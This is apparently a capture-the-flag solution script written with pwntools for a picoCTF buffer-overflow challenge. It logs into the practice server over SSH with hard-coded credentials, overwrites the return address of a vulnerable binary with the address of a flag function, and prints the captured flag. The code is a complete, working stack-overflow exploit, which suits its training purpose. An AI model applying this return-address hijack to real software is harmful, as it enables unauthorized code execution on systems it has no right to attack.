from pwn import *

session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard", level=50)

genStr = ''
i = 97
while len(genStr) < 101:
    genStr = genStr + chr(i) * 4
    i = i + 1

addrOfFlagFxn = '\xe6\x85\x04\x08'  # got 0x080485e6 using radare2 and opening a visual form of the binary
payload = genStr.replace('tttt', addrOfFlagFxn)  # got b'tttt' by overflowing buffer and seeing return address

program = session.process(['./vuln'], cwd='/problems/overflow-1_2_305519bf80dcdebd46c8950854760999')

program.recvline()
program.sendline(payload)
program.recvline()

flagInB = program.recv()
flag = flagInB.decode('ascii')
rawFlag = flag[flag.index('{') + 1:flag.index('}')]

print(rawFlag)

program.close()
session.close()
